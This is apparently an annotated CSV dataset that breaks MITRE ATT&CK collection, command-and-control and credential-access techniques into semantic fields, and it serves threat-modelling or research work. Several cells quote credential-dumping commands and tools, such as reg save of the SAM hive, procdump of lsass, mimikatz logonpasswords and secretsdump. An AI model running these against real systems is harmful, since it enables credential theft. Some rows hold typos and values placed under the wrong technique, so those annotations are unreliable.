0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,1,,154,collection ,data from removable media,t1025,search/access/read/mount/collect-data,removable-media,sensitive,,,,"exfiltration;<what> find <\what> <where>files of interest.<where> interactive command shells <\where> may be in<what>  use <\what>, and <attribute> common functionality <\attribute> within <where> cmd <\where> may be <what> used <\what>to <why> gather information","find  ,   use  ,  used","files of interest.<where> interactive command shells  ,  cmd","removable media (optical disk drive, usb memory, etc.)",,,"system-compromized
removable-media-enabled
removable-media-connected",,removable-media-read ,automated collection
,1,,153,collection ,data from network shared drive,t1039,search/access/read/mount/collect-data,network-share/network-share-drive,sensitive,,compromised,computers,exfiltration;gather information;<what> find <\what> <where>files <\where>;collect data,"find,collect","files,sensitive data","remote systems via shared network drives (host shared directory, network file server, etc.);use interactive command shells/cmd",use,"interactive command shells, cmd",,,,
,1,,86,collection ,clipboard data,t1115,collect/access/read,clipboard data,stored in the windows clipboard,,,,<what> grab <\what> <where> clipboard contents <\where>,grab,clipboard contents,,use,pbpaste/windows api,information-copied,exfiltration ,cliboard-access,
,1,,52,collection ,automated collection,t1119,collect/search/copy/move/identify,data/information/file type/location/name,,<condition> established <\condition> within a <object> system or network <\object>,established,system or network,gather information,,,,use,"Scripting, Fiel and Directory Discovery/Remote file Copy",file-access/directory-access,file-collected/data-collected,file-collected/data-collected,
,1,,49,collection ,audio capture,t1123 , listen/capture/read/open, audio-recordings/audio-device ,,,,,gather information,,,, use/levarage,peripheral devices/applications;conversations/malware/scripts / microphones/webcams;voice and video call services ,device-access/webcam-access,,audio-device-access/open/read,
,1,,151,collection ,data from information repositories,t1213,leverage/use,information repositories,"policies, procedures, and standardsphysical / logical network diagrams /system architecture diagrams/ technical system documentation testing / development credentialswork / project schedules source code snippets links to network shares and other internal resourcesspecific common information repositories include:microsoft sharepoint  /atlassian confluence",,,,<what> mine <\what> valuable <where> information <\where>,mine,information,,,,information-repository-access,data-collected,data-collected,
,1,1,156,command and control,data obfuscation,t1001,hide,command and control (c2) communications,,,,,difficult to discover or decipher ; make the communication less conspicuous ; <what> hide <\what><where> commands <\where> from being seen,make difficult; make communication; hide,disvover command; less conspicuous; command,add junck data to protocol traffic; use steganography; <what>  commingling <\what> legitimate <where> traffic <\where> with c2 communications traffic; use  non-standard data encoding system,add-junk-data; use; commingle-legitimate-traffic; use,protocol traffic; steganography; C2 traffic; non-standard data encoding system,C2-Channel-established,,data-flow-uncommon,
,1,1,156,command and control,data obfuscation,t1001,add-junk-data,protocol traffic,,,,,difficult to discover or decipher ; make the communication less conspicuous ; <what> hide <\what><where> commands <\where> from being seen,make difficult; make communication; hide,disvover command; less conspicuous; command,,,,System-compromised,,data-flow-uncommon,
,1,1,156,command and control,data obfuscation,t1001,commingle-legitimate-traffic,C2 traffic,,,,,difficult to discover or decipher ; make the communication less conspicuous ; <what> hide <\what><where> commands <\where> from being seen,make difficult; make communication; hide,disvover command; less conspicuous; command,,,,System-compromised,,data-flow-uncommon,
,1,1,156,command and control,data obfuscation,t1001,use,steganography/non-standard data encoding system,modified base64 encoding,,,,difficult to discover or decipher ; make the communication less conspicuous ; <what> hide <\what><where> commands <\where> from being seen,make difficult; make communication; hide,disvover command; less conspicuous; command,,,,System-compromised,,data-flow-uncommon,
,1,,238,command and control,fallback channels,t1008,use,fallback/communication channels,alternate,<object>primary channel <\object>is <condition> compromised<\condition> or <condition>inaccessible <\condition>,compromised,primary channel,<what>maintain <\what>  <attribute>reliable <\attribute><where>command and control <\where> and to <why> <what> avoid <\what> <where> data transfer <\where> thresholds,"maintain  ,  avoid","command and control  ,  data transfer",,,,primary-channel-inaccessible,,C2-channel-switched,
,1,,147,command and control,custom cryptographic protocol,t1024,encrypt/encode,C2 traffic,,,,,<what> hide <\what> <where> command and control traffic <\where>;lead to unintentional errors,hide,command and control traffic,use custom cryptographic protocol/custom cryptographic algorithm,use,custom cryptographic protocol/custom cryptographic algorithm; XORing the plaintext with fixed key,C2-Channel-established,,traffic-encrypted,
,1,,380,command and control,multiband communication,t1026,split,communication/network traffic/C2 traffic,,,,,"<what>bypass<\what> certain <where>firewall restrictions<\where> , <what>avoid<\what> <where>data threshold alerts<\where> on any one communication","bypass , avoid","firewall restrictions , data threshold alerts",use different protocol,use,different protocol,C2-Channel-established,,different-protocol-used,
,1,,663,command and control,standard cryptographic protocol,t1032 ,encrypt/encode,C2 traffic/c2 communication,,,,,conceal <where>command and control traffic<\where>,conceal,command and control traffic,use known encryption algorithm;employ known encryption algorithm,use/employ,encryption algorithm,C2-Channel-established,,traffic-encrypted,
,1,,97,command and control,uncommonly used port,t1065 ,conduct/communicate/send,c2 communication/C2 traffic,,that have been <condition>improperly configured<\condition>,improperly configured,,<what>bypass<\what> <where>proxies<\where> and <where>firewalls<\where>,bypass,"proxies , firewalls",using uncommonly used port,use,uncommonly used port,System-compromised,,uncommon-port-used,
,1,,660,command and control,standard application layer protocol,t1071 ,blend-command/ embed-command/ communicate/send,traffic/ c2 traffic,existing,machine is-a compromised,,,avoid detection,,,"using a common, standardized application layer protocol ,  using  http ,  using  https ,  using  smtp ,  using  dns",use,common/standardized application layer protocol/ http/https /smtp / dns,C2-Channel-established,,application-layer-protocol-used,
,1,,382,command and control,multilayer encryption,t1079 ,perform/communicate/send,c2 communication/c2 traffic,,machine is-a compromised,,,,,,"using multiple layers of encryption , tunneling a custom encryption scheme within a protocol encryption scheme",,,C2-Channel-established,,traffic-encrypted,
,,,113,command and control,connection proxy,t1090,perform/communicate/send,c2 communication/c2 traffic,,machine is-a compromised,,,<what> manage <\what><where>command and control communications<\where> . <what> reduce <\what> the number of simultaneous <attribute> outbound <\attribute> <where> network connections<\where> . <what> provide resiliency<\what>  in the face of <where> connection loss<\where>  ride over existing trusted communications paths between victims avoid suspicion,"manage  ,  reduce  ,  provide resiliency","command and control communications ,  network connections ,  connection loss","using proxy/using port redirection/using HTRAN,ZXProxy,ZXPortMap",use,proxy/port redirection/HTRAN/ZXProxy/ZXPortMsp,C2-Channel-established,,traffic-redirected(??),
,1,,99,command and control,communication through removable media,t1092,perform/communicate/send,c2 communication/c2 traffic,,<object> systems <\object> would need to be <condition> compromised <\condition>,compromised; direct access,systems,transfer commands from system to system,transfer,command,removable media;lateral movement  by replication through removable media,,,System-compromised; removable-media-enabled;autorun-enabled,replication through removable media,command-transferred,
,1,,146,command and control,custom command and control protocol,t1094,communicate/send/encapsulate,c2 communication/c2 traffic,,,,,,,,using custom command and control protocol,use,custom command and control protocol,C2-Channel-established,,non-standard-protocol-used,
,1,,664,command and control,standard non-application layer protocol,t1095,perform/communicate/send,c2 communication/c2 traffic,,,,,hide communications,hide,c2 communication,"use of a standard non-application layer protocol , use of network layer protocols, such as the internet control message protocol (icmp) , , transport layer protocols, such as the user datagram protocol (udp)  , ,session layer protocols, such as socket sec",use,standard non-application layer protocol/internet control message protocol (icmp)/transport layer protocol/user datagram protocol/session layer protocol,C2-Channel-established,,non-application-layer-protocol-used,
,1,,765,command and control,web service,t1102 ,use, web service/common service,"existing/legitimate external,offered by google or twitter",once <condition>infected<\condition>,infected/compromised,system,relaying commands to a compromised system;hide in expected noise,,,"post content, known as a dead drop resolver on web services with embedded (and often obfuscated/encoded) domains or ip addresses",,,System-compromised,,??,
,1,,383,command and control,Multi-Stage Channels,t1104,"use
create,obfuscate,call back, upload","muli-stage channel
command and control channel,command and control server, Remote access tool","multi stage,first stage, second stage",,,,"collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host ",use remote access tool;use multi stage channel,use,remote access tool;multi stage channel,,,,
,1,,541,command and control,remote file copy,t1105 ,copy,file,,C2-Channel is-a established,,,stage adversary tools or other files;bring tools into the victim network,"stage, copy","adversary tool, file ","command and control channel , alternate protocols with another tool , ftp; mac and linux with native tools , scp , rsync , sftp  ;remote execution using inherent file sharing protocols such as file sharing over smb , authenticated connections with windows admin shares , remote desktop protocol",,,"C2-Channel-established,File-identified",Windows admin share/Remote desktop protocol,File-written,
,1,,149,command and control,data encoding,t1132,encode,c2 communication/C2 traffic,,,,,hide C2 command,,,using standard data encoding system/ASCII/Unicode/Base64/MIME/UTF-8/ binary-to-text/character encoding system,use,standard data encoding system/ASCII/Unicode/Base64/MIME/UTF-8/ binary-to-text/character encoding system/gzip,encoding-system-available,,data-encoded,
1,,,178,command and control,domain fronting,t1172,obfuscate/hide,destination,,,,,domain fronting/hiding/disguise,hiding/disguise,destination ,"using TLS, HTTP, TLS header SNI field are not equal to HTTP header",use,TLS and HTTP ,"SNI-field-in-TLS-and-HTTP-not-equal
",,traffic-redirected(??),
,1,,381,command and control,multi-hop proxy,t1188,chain/link,proxy,multiple,,,,<what> disguise <\what> the <where> source <\where> of <attribute> malicious traffic <\attribute>;<what> identify<\what> its <where>source <\where>,disguise/identify,source,using several proxies,,,proxy-multiple,,traffic-redirected(??),
,1,,534,command and control,remote access tools,t1219 ,use,desktop support/remote access software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",,,"using desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",,,remote-access-software-whitlisted,Redundant Access,??,
,1,,179,command and control,domain generation algorithms,t1483,employ/use,domain generation algorithms (dgas)/DGA,,,,,dynamically identify a destination for command and control traffic,,,,,,System-compromised,Fallback Channels,multiple-domain-checked,
,1,,98,command and control ,commonly used port,t1043 , communicate/send,c2 communication/C2 traffic,,,,,"bypass firewall/nds,blend with normal traffic activity,avoid detailed inspection",,,using  tcp:80 (http)/ tcp:443 (https)/tcp:25 (smtp)/tcp/udp:53 (dns)/tcp/udp:135 (rpc)/tcp/udp:22 (ssh)/tcp/udp:3389 (rdp)  ,use,tcp:80 (http)/ tcp:443 (https)/tcp:25 (smtp)/tcp/udp:53 (dns)/tcp/udp:135 (rpc)/tcp/udp:22 (ssh)/tcp/udp:3389 (rdp),System-compromised,,common-port-used,
,,,735,credential access,two-factor authentication interception,t1111,use,keylogger,,<condition><object>smart card<\object> is used for two-factor authentication (2fa) <\condition> ,<object>smart card<\object> is used for two-factor authentication ,smart card,"<what>intercept<\what> and <what>bypass<\what> these <where>security mechanisms<\where> , <what>gain access<\what> to <where>systems<\where>, <where>services<\where>, and <where>network resources<\where> , <what>obtain<\what> the <where>password<\where> a","intercept , bypass , gain access , obtain","security mechanisms , systems , services , network resources , password",,,,,,,
,,,736,credential access,two-factor authentication interception,t1111,intercept/obtain,password  ,,,,,,,,,using,infected system,,,,
,,,737,credential access,two-factor authentication interception,t1111,bypass,security mechanism,,infected system,,,,,,,,,,,,
,,,738,credential access,two-factor authentication interception,t1111,gain access,system/service/network resource,,,,,,,,,,,credential-protected,credential-exposed,credential-exposed,
,,,739,credential access,two-factor authentication interception,t1111,connect,network resource,,,,,<what>proxy<\what> the <where>authentication<\where> with the inserted hardware token,proxy,authentication,<what>using<\what> the <where>infected system<\where>,use,keylogger,credential-protected,credential-exposed,credential-exposed,
,,,740,credential access,two-factor authentication interception,t1111,proxy authenticate,hardware token,,,,,,,,,,,credential-protected,credential-exposed,credential-exposed,
,,,741,credential access,two-factor authentication interception,t1111,employ,keylogger,,,,,"provide temporary access , <what>predict<\what> future <where>authentication values<\where>",,,,,,,,,
,,,742,credential access,two-factor authentication interception,t1111,capture,token input,,,,,"provide temporary access , <what>predict<\what> future <where>authentication values<\where>",predict,authentication values,using keylogger,,,private-key-unknown,private-key-collected,private-key-collected,
,1,,298,credential access,input prompt,t1141,mimic/use,input prompt,,,,,<what>prompt<\what> <where>users<\where> for credentials;<what>collect<\what> <where>credentials<\where> via various languages such as applescript[2][3] and powershell,"prompt,collect","users,credential","seemingly legitimate prompt , fake installer requiring additional access , fake malware removal suite",,,,,,
,,,299,credential access,input prompt,t1141,prompt-user,credential,,,,,,,,,,,,,,
,,,323,credential access,keychain,t1142,access,keychain,,adversary <condition>knows the <object>credentials<\object> for the login keychain<\condition>,knows the <object>credentials<\object> for the login keychain,credentials,collect credential,collect,credentials,using security command line utility,,,,,,
,,,470,credential access,private keys,t1145,gather,private key,,system is compromised,,,"use in authenticating to remote services like ssh , use in decrypting other collected files such as email",,,,,,,,,
,,,471,credential access,private keys,t1145,authenticate,remote service/ssh,,,,,,,,,,,private-key-password-protected,private-key-password-exposed,private-key-password-exposed,
,,,472,credential access,private keys,t1145,decrypt,file,,,,,,,,,,,,,,
,,,473,credential access,private keys,t1145,look/search,directories/file extension,"~/.ssh , c:\users(username).ssh\",,,,,,,,,,credential-protected,credential-exposed,credential-exposed,
,,,474,credential access,private keys,t1145,use,input capture,,,,,to capture privatekey password,,,keylogging,,,,,,
,,,475,credential access,private keys,t1145,attempt brute force,key,,,,,,,,,responding,llmnr (udp 5355)/nbt-ns (udp 137) traffic,destination-benign,destination-adversary,destination-adversary,
,,,581,Credential Access,Securityd Memory,T1167,scan,securityd memory  ,,adversary can <condition>obtain <object>root access<\object><\condition>,obtain <object>root access<\object>,root access,<what>find<\what> the correct sequence of <where>keys<where>,find,keys,,,,,,,
,,,582,Credential Access,Securityd Memory,t1167,find,key,correct sequence,,,,,,,,,,,,,
,,,333,credential access,llmnr/nbt-ns poisoning and relay,t1171,spoof,authoritative source,,,,,name resolution; <what>obtain<\what> the plaintext <where>passwords<\where>,,,<what>responding<\what> to <where>llmnr (udp 5355)/nbt-ns (udp 137) traffic<\where>,,,,,,
,,,334,credential access,llmnr/nbt-ns poisoning and relay,t1171,"send , collect , crack","username , ntlmv2 hash  , hash",,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition> ,requires identification/authentication,requested host,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,,
,,,335,credential access,llmnr/nbt-ns poisoning and relay,t1171,intercept,ntlmv2 hash,,access to authentication path,,,,,,,use,tool/responder/metasploit/nbnspoof,destination-benign,destination-adversary,destination-adversary,
,,,336,credential access,llmnr/nbt-ns poisoning and relay,t1171,relay,ntlmv2 hash,,,,,<what>access<\what> and <what>execute<\what> <where>code<\where>,"access , execute",code,,,,credential-protected,credential-exposed,credential-exposed,
,,,337,credential access,llmnr/nbt-ns poisoning and relay,t1171,use,tool/responder/metasploit/nbnspoof,,,,,<what>poison<\what> <where>name services<\where>,poison,name services,,using,service tickets,credential-protected,credential-exposed,credential-exposed,
,,,338,credential access,llmnr/nbt-ns poisoning and relay,t1171,poison,name service,,,,,,,,using tool/responder/metasploit/nbnspoof,,,credential-protected,credential-exposed,credential-exposed,
,,,445,credential access,password filter dll,t1174,register,password filter DLL,malicious,<condition>filters must receive <object>plain-text credentials<\object><\condition> from the lsa,filters must receive <object>plain-text credentials<\object>,plain-text credentials,<what>harvest<\what> <where>credentials<\where> from local computers and/or entire domains,harvest,credentials,,,,,,,
,,,446,credential access,password filter dll,t1174,harvest,credential,,,,,,,,,,,ntlmv2-hash-unknown,ntlmv2-hash-exposed,ntlmv2-hash-exposed,
,,,320,credential access,kerberoasting,t1208,"requet/capture, perform/execute","services ticket/Kerberos Ticket Granting Ticket/Kerberos Ticket Granting Service Ticket/TGT/TGS,
brute-force",offline,,,,,expose ,plaintext credentials ,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,,
,,,321,credential access,kerberoasting,t1208,crack,hash,,,,,"enable persistence, privilege escalation, and lateral movement",,,access to valid accounts,,,,,,
,,,118,credential access ,credential dumping,t1003 ,obtain, login ,,,,,,,,,,,,,,
,,,119,credential access ,credential dumping,t1003 ,use,"password /password hash ,  credentials ","information  ,  sam database", system level access is required ,,, <what> perform <\what> <where> lateral movement <\where>   <what> access <\what> <where> restricted information <\where> ," perform  ,  access "," lateral movement  ,  restricted information ", form of a <where> hash<\where> or a <where>clear text password<\where> sam database ,,,,,,
,,,120,credential access ,credential dumping,t1003 ,use,tools,,,,, retrieve the sam file through in-memory techniques ,,,pwdumpx.exegsecdumpmimikatzsecretsdump.py,,,,,,
,,,121,credential access ,credential dumping,t1003 , extracted , sam ,,,,,,,,reg save hklm\sam samreg save hklm\system system,,,,,,
,,,122,credential access ,credential dumping,t1003 ,use, creddump7 ,,,,, process the sam database locally to retrieve hashes. ,,, dcc2 (domain cached credentials version 2) hash,,,,,,
,,,123,credential access ,credential dumping,t1003 ,use, tools ,,,,, retrieve the sam file ,,,pwdumpx.exegsecdumpmimikatz,,,,,,
,,,124,credential access ,credential dumping,t1003 ,use, reg.exe ,,,,, extract from the registry and creddump7 used to gather the credentials ,,,pbkdf2 local security authority (lsa) secrets,,,,,,
,,,125,credential access ,credential dumping,t1003 ,use, registry ,,run under the context of local or domain users ,,, store the lsa secrets ,,,,,,,,,
,,,126,credential access ,credential dumping,t1003 , stored , passwords ,,auto-logon is enabled,,,,,,,,,,,,
,,,127,credential access ,credential dumping,t1003 , stored , information ,,,,,,,,,,,,,,
,,,128,credential access ,credential dumping,t1003 ,use, tools ,,,,, retrieve the sam file ,,,pwdumpx.exegsecdumpmimikatzsecretsdump.py,,,,,,
,,,129,credential access ,credential dumping,t1003 ,use, reg.exe ,,,,, extract from the registry and creddump7 used to gather the credentials ,,,,,,,,,
,,,130,credential access ,credential dumping,t1003 ,use, tools ,,,,, enumerate the ntds file and the contents of the entire active directory hashes,,,"volume shadow copysecretsdump.pyusing the in-built windows tool, ntdsutil.exeinvoke-ninjacopy group policy preferences (gpp) ",,,,,,
,,,131,credential access ,credential dumping,t1003 , decrypt , password ,,,,,,,,,,,,,,
,,,132,credential access ,credential dumping,t1003 ,use,tools and scripts,,,,,gather and decrypt the password file from group policy preference xml files,,,metasploit’s post exploitation module: post/windows/gather/credentials/gppget-gpppasswordgpprefdecrypt.py,,,,,,
,,,133,credential access ,credential dumping,t1003 ,use, ssps ,,,,," interactive logons, batch logons, and service logons ",,, msv authentication package.wdigest: windows credential editormimikatzprocdump: procdump -ma lsass.exe lsass_dump,,,,,,
,,,134,credential access ,credential dumping,t1003 ,run , mimikatz ,,,,,,,,sekurlsa::minidump lsassdump.dmpsekurlsa::logonpasswords,,,,,,
,,,135,credential access ,credential dumping,t1003 ,use, dcsync ,,,,, acquire sensitive information ,,,,,,,,,
,,,136,credential access ,credential dumping,t1003 ,run , dcsync ,,,,, pull password data from active directory ,,,,,,,,,
,,,137,credential access ,credential dumping,t1003 ,use, hashes ,,,,, create a golden ticket for use in pass the ticket or change an account's password as noted in account manipulation ,,, lsadump  mimikatz  lsadump  netsync,,,,,,
,,,138,credential access ,credential dumping,t1003 ,dump , process memory ,,,,,,,,,,,,,,
,,,139,credential access ,credential dumping,t1003 , harvests ,passwords and hashes ,,,,, store such authentication artifacts ,,," looking for text strings and regex patterns  gnome keyring, sshd, and apache use memory ",,,,,,
,1,,140,credential access ,credential in files,t1081,"search, extract",local file systems/remote file shares,,files containing passwords,,,obtained/get,password,,<tech> credential dumping <\tech>  group policy preferences stored on the windows domain controller,,,,,,
,1,,21,credential access ,account manipulation,t1098,maintaining-access,credentials,,<condition> sufficient permissions <\condition> on <object> systems <\object>or the<object> domain<\object>,sufficient permissions,systems,subvert security policies  subvert password duration policies  preserve the life of compromised credentials,,,<what> modifying <\what><where>credentials<\where>  <what>adding<\what> or <what>changing<\what><where> permission groups<\where>  <what>modifying<\what> <where>account settings <\where> <what>modifying<\what> how <where>authentication<\where> is performed,"modifying  , adding , changing , modifying , modifying","credentials/permission/password ,  permission groups , account settings  , authentication",,,,
,,,72,credential access ,brute force,t1110,use,brute force,,<object> passwords <\object> are <condition> unknown <\condition>  <object> password hashes <\object> are <condition> obtained <\condition>,"unknown  ,  obtained","passwords  ,  password hashes",attempt access to accounts,,,,,,,,,
,,,73,credential access ,brute force,t1110,use,credential dumping,,,,,obtain password hashes,,,,,,,,,
,,,74,credential access ,brute force,t1110,guess,passwords,,,,,compute hashes are available,,,,,,,,,
,,,75,credential access ,brute force,t1110,use,rainbow table,pre-computed,,,,<what> crack <\what> <where>hashes<\where>,crack,hashes,,,,,,,
,,,76,credential access ,brute force,t1110,attempt,brute force logins,,<condition> without knowledge<\condition> of <object>passwords or hashes <\object>,without knowledge,passwords or hashes,,,,attempting a list of known or possible passwords,,,,,,
,,,77,credential access ,brute force,t1110,use,password spraying,management services,,,,,,,one password (e.g. 'password01')  small list of passwords,,,,,,
,,,78,credential access ,brute force,t1110,use,commonly used ports,,password spraying,,,,,,<where>ssh (22/tcp) <\where><where>telnet (23/tcp) <\where><where>ftp (21/tcp) <\where><where>netbios / smb / samba (139/tcp & 445/tcp) <\where><where>ldap (389/tcp) <\where><where>kerberos (88/tcp) <\where><where>rdp / terminal services (3389/tcp) <\where><where>http/http management services (80/tcp & 443/tcp) <\where><where>mssql (1433/tcp) <\where><where>oracle (1521/tcp) <\where><where>mysql (3306/tcp) <\where><where>vnc (5900/tcp) <\where>,,"ssh (22/tcp)  , telnet (23/tcp)  , ftp (21/tcp)  , netbios / smb / samba (139/tcp & 445/tcp)  , ldap (389/tcp)  , kerberos (88/tcp)  , rdp / terminal services (3389/tcp)  , http/http management services (80/tcp & 443/tcp)  , mssql (1433/tcp)  , oracle (1521/tcp)  , mysql (3306/tcp)  , vnc (5900/tcp)",,,,
,1,,56,credential access ,bash history,t1139,look/search,file,,<object> user <\object> <condition> logs out <\condition>,logs out,user,potential credentials,,,,,,,,,
,,,253,credential access ,forced authentication,t1187,take advantage,this behavior,,,,,<what> gain access <\what> to <attribute> user account <\attribute> <where> hashes <\where>,gain access,hashes,<what> forced <\what> <where>smb authentication <\where>,forced,smb authentication,,,,
,,,254,credential access ,forced authentication,t1187,send,attachment,,user's system accesses the untrusted resource,,,,,,spearphishing,,,,,,
,,,255,credential access ,forced authentication,t1187,"authentication  ,  send",information,,,,,,,,,,,,,,
,,,256,credential access ,forced authentication,t1187,perform,hashed credentials,,access to the credential hash,,,,,,,,,,,,
,,,257,credential access ,forced authentication,t1187,attachment,"off-line brute force cracking  ,  spearphishing",file[:]//[remote address]/normal.dotm,document is opened (i.e. template injection),,,"<what> gain access  <\what>to <where> plaintext credentials<\where><why>, or <what>reuse <\what> <where> off-line brute force cracking <\where> it for <why> pass the hash  trigger the smb request","gain access   , reuse","plaintext credentials ,  off-line brute force cracking",,,,,,,
,,,258,credential access ,forced authentication,t1187,modified,.lnk or .scf file,,,,,<what> load <\what> the <where> resource <\where>  repeatedly gather credentials,load,resource,,,,,,,
,1,,214,credential access ,exploitation for credential access,t1212,use/abuse/takes advantage,programming error,"program, service  ,  operating system software  ,  kernel",,,,<what> execute <\what> <where> adversary-controlled code <\where>,execute,adversary-controlled code,,,,,,,
,,,215,credential access ,exploitation for credential access,t1212,target/use,"credentialing mechanisms, authentication mechanisms,kerberos",,,,,exploitation  <what> gain access <\what> to useful <where> credentials <\where> or <what> circumvent <\what> the <where> process <\where> <what> gain access <\what> to <where> systems <\where>;forge kerberos tickets,"gain access  ,  circumvent  ,  gain access","credentials  ,  process  ,  systems",domain user permissions,,,,,,
